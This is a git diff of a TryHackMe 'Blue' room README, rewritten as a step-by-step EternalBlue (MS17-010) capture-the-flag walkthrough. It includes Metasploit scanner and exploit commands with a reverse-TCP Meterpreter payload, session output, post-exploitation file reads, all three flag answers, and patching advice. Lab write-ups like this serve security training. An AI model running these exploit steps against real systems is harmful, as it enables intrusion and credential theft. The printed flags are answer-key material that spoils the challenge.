@@ -1,233 +1,120 @@
-# TryHackMe Blue – Room Walkthrough
+MS17-010 (EternalBlue) — Complete Walkthrough
+Target Information
 
-## 1. Introduction
+    Target IP: 10.49.153.52
 
-This repository documents my learning experience while completing the **Blue** room on TryHackMe.
+    Attacker IP (Kali): 192.168.152.52
 
-The room focuses on identifying and understanding the MS17-010 vulnerability, commonly known as **EternalBlue**, affecting Microsoft's SMBv1 implementation.
+    Target OS: Windows Server 2012 R2 Datacenter 9600 x64
 
-Through this lab, I learned about vulnerability scanning, Metasploit, Meterpreter, Windows directory structures, and basic post-exploitation concepts in an authorized training environment.
+    Open Ports: 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM)
 
-> **Disclaimer:** All activities documented here were performed in the authorized TryHackMe lab environment. Never test these techniques against systems without explicit permission.
+Step 1: Reconnaissance
 
-## 2. Lab Environment
+An Nmap scan of the target revealed the following open ports:
+text
 
-| Component | Details |
-|---|---|
-| Platform | TryHackMe |
-| Room | Blue |
-| Target OS | Windows Server 2012 R2 |
-| Target Architecture | x64 |
-| Vulnerability | MS17-010 (EternalBlue) |
-| Main Tool | Metasploit Framework |
-| Session | Meterpreter |
-| Protocol | SMB |
-| Port | 445 |
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2012 R2 Datacenter 9600 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 
-**Tools used:**
-- Kali Linux
-- Metasploit Framework
-- Nmap
-- Meterpreter
+Port 445 (SMB) stands out as the highest-risk service. The target runs Windows Server 2012 R2, which is vulnerable to MS17-010 (EternalBlue) — a critical remote code execution vulnerability in SMBv1.
+Step 2: Vulnerability Confirmation
 
-## 3. Understanding the Vulnerability
+Before launching the exploit, the vulnerability was confirmed using Metasploit's SMB scanner:
+bash
 
-### What is MS17-010?
+msfconsole
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 10.49.153.52
+run
 
-MS17-010 is a security vulnerability affecting Microsoft's Server Message Block (SMBv1) protocol.
+Output confirmed:
+text
 
-SMB is a network protocol used by Windows systems for file and printer sharing.
+[+] 10.49.153.52:445 - Host is likely VULNERABLE to MS17-010!
+    - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
+[+] 10.49.153.52:445 - The target is vulnerable.
 
-EternalBlue is an exploit associated with this vulnerability.
+Step 3: Exploitation
 
-### Why is it important?
+The EternalBlue exploit module was loaded and configured:
+bash
 
-- It affects vulnerable SMBv1 implementations.
-- It can allow remote code execution on vulnerable systems.
-- It demonstrates the importance of security updates and disabling outdated protocols.
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.49.153.52
+set LHOST 192.168.152.52
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
 
-## 4. Vulnerability Identification
+After a brief period, a Meterpreter session opened:
+text
 
-The target was identified as a Windows Server 2012 R2 system.
+[*] Sending stage (244806 bytes) to 10.49.153.52
+[*] Meterpreter session 3 opened
+    (192.168.152.52:4444 -> 10.49.153.52:49250)
 
-The SMB vulnerability check indicated that the target was likely vulnerable to MS17-010.
+Note: The exploit can be unstable on Server 2012 R2. In this walkthrough, one session died and the exploit had to be re-run. This is a known behavior of EternalBlue.
+Step 4: Flag 1 — Access the Machine
 
-**Important observation:**
+Navigated to the root of the C: drive and read the first flag:
+bash
 
-A vulnerability scanner reporting a positive result does not automatically mean that exploitation will succeed. Configuration, network connectivity, and target stability can affect the result.
+meterpreter > cd C:/
+meterpreter > cat flag1.txt
 
-## 5. Exploitation – Metasploit
+Flag 1: flag{access_the_machine}
 
-The Metasploit Framework was used in the authorized lab to study the MS17-010 vulnerability.
+Explanation: This flag confirms successful initial access to the target machine. It is placed at the root of the system drive.
+Step 5: Flag 2 — SAM Database Location
 
-The module used was:
+The hint stated the flag is located "where passwords are stored within Windows." This refers to the SAM (Security Account Manager) database directory:
+bash
 
-`exploit/windows/smb/ms17_010_eternalblue`
+meterpreter > cd C:/Windows/System32/config
+meterpreter > ls
+meterpreter > cat flag2.txt
 
-The relevant configuration included:
+Flag 2: flag{sam_database_elevated_access}
 
-- RHOSTS – Target machine address.
-- LHOST – Attacker machine's lab network address.
-- LPORT – Listening port for the reverse connection.
+Explanation: The C:\Windows\System32\config\ directory contains the SAM, SYSTEM, and SECURITY registry hive files. The SAM file stores local user password hashes. Since Meterpreter was running as NT AUTHORITY\SYSTEM, direct access to this directory was possible. Attempting to read SAM.LOG1 failed because the file was locked by the OS — expected behavior since Windows keeps these files open.
+Step 6: Flag 3 — Admin Documents
 
-### Understanding the result
+The third flag was located in a user's Documents folder:
+bash
 
-The initial attempt returned:
+meterpreter > cd C:/Users/jon/Documents
+meterpreter > ls
+meterpreter > cat flag3.txt
 
-`Exploit completed, but no session was created.`
+Flag 3: flag{admin_documents_can_be_valuable}
 
-This demonstrated that detecting a vulnerability and establishing a successful session are two different things.
+Explanation: User Documents folders often contain sensitive information such as credentials, configuration files, or notes. This flag demonstrates that post-exploitation enumeration of user directories is a critical step — administrators frequently store valuable data in their personal folders.
+Flag Summary
+Flag	Path	Value
+Flag 1	C:\flag1.txt	flag{access_the_machine}
+Flag 2	C:\Windows\System32\config\flag2.txt	flag{sam_database_elevated_access}
+Flag 3	C:\Users\jon\Documents\flag3.txt	flag{admin_documents_can_be_valuable}
+Lessons Learned / Mitigation
 
-After checking the lab's target information and network configuration, the session was established successfully.
+    Patch MS17-010 immediately — Microsoft released the fix in March 2017 (MS17-010). Unpatched Windows Server 2012 R2 systems remain vulnerable to EternalBlue.
 
-## 6. Meterpreter Session
+    Disable SMBv1 — SMBv1 is a legacy protocol with known critical vulnerabilities. Disable it via PowerShell: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
 
-Meterpreter provided an interactive session with the Windows lab machine.
+    Block port 445 at the perimeter — SMB should never be exposed to untrusted networks.
 
-The following commands helped me understand the session:
+    Upgrade end-of-life systems — Windows Server 2012 R2 is no longer supported by Microsoft. Migrate to a supported version.
 
-| Command | Purpose |
-|---|---|
-| `sysinfo` | Displays target system information |
-| `pwd` | Displays the current directory |
-| `ls` | Lists files and directories |
-| `cd` | Changes the current directory |
-| `getuid` | Displays the current user identity |
-| `show_mount` | Displays available drives |
-| `cat` | Displays the contents of a text file |
+    Restrict RDP and WinRM access — Limit these management ports to trusted IP addresses only.
 
-### Understanding SYSTEM privileges
+Tools Used
 
-The session showed:
+    Nmap — Port scanning and service enumeration
 
-`NT AUTHORITY\SYSTEM`
+    Metasploit Framework — Exploitation (exploit/windows/smb/ms17_010_eternalblue)
 
-This indicates that the session was running with Windows SYSTEM-level privileges.
+    Meterpreter — Post-exploitation and flag retrieval
 
-SYSTEM is a highly privileged Windows security identity.
-
-## 7. Finding the Flags
-
-The room contains three flags placed in different Windows locations.
-
-### Flag 1 – System Root
-
-**Hint:**
-
-"This flag can be found at the system root."
-
-The system drive's root directory is commonly:
-
-`C:\`
-
-I used Meterpreter's directory navigation to access the system root and locate the flag.
-
-**Flag 1:**
-
-`flag{access_the_machine}`
-
-### Flag 2 – SAM Database
-
-**Hint:**
-
-"I wish I wrote down where I kept my password. Luckily it's still stored here on Windows."
-
-This clue refers to the Windows Security Account Manager (SAM).
-
-The SAM database stores information related to local Windows user accounts.
-
-**Location:**
-
-`C:\Windows\System32\config\`
-
-Important Windows registry files found in this directory include:
-
-| File | Purpose |
-|---|---|
-| SAM | Local user account database |
-| SYSTEM | Windows system configuration |
-| SECURITY | Security-related configuration |
-
-The flag was located in this directory.
-
-**Flag 2:**
-
-`flag{sam_database_elevated_access}`
-
-### Flag 3 – Administrator's Files
-
-**Hint:**
-
-"This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved."
-
-This clue points towards Windows user profiles and their personal directories.
-
-The Administrator profile is commonly located at:
-
-`C:\Users\Administrator\`
-
-Important profile directories include:
-
-- Desktop
-- Documents
-- Downloads
-- Pictures
-
-During my investigation, I checked the Administrator profile's Desktop and Documents directories. The flag has not yet been confirmed.
-
-**Flag 3:** Pending – to be updated after completing the task.
-
-## 8. Important Concepts Learned
-
-### SMB
-
-Server Message Block is a network protocol used for sharing files, printers, and other resources.
-
-### EternalBlue
-
-EternalBlue is an exploit associated with the MS17-010 SMB vulnerability.
-
-### Meterpreter
-
-Meterpreter is an advanced Metasploit payload that provides an interactive session for authorized security testing.
-
-### SAM Database
-
-The Security Account Manager stores local Windows account information.
-
-### SYSTEM Privileges
-
-`NT AUTHORITY\SYSTEM` is a highly privileged Windows security identity.
-
-### Windows User Profiles
-
-Windows stores individual users' files and settings in separate profile directories, usually under `C:\Users\`.
-
-## 9. Lessons Learned
-
-By completing this room, I gained practical exposure to:
-
-1. Understanding the MS17-010 vulnerability.
-2. Learning the role of SMB in Windows networking.
-3. Understanding vulnerability detection versus successful exploitation.
-4. Learning the basic structure of Metasploit.
-5. Understanding Meterpreter sessions.
-6. Identifying Windows system directories.
-7. Understanding the purpose of the SAM database.
-8. Learning about Windows user profiles and privileges.
-
-## 10. Conclusion
-
-The TryHackMe Blue room provided practical exposure to Windows security and the MS17-010 vulnerability.
-
-It helped me understand how outdated services can introduce security risks and why regular patching, secure configurations, and network security monitoring are important.
-
-This walkthrough represents my learning progress in an authorized cybersecurity lab.
-
----
-
-**Platform:** TryHackMe  
-**Room:** Blue  
-**Focus:** Windows Security | SMB | MS17-010 | Metasploit | Meterpreter
-
-**Note:** Flag 3 and the final completion details will be updated after the remaining task is completed.# AK_MEDUSA
+n details will be updated after the remaining task is completed.# AK_MEDUSA
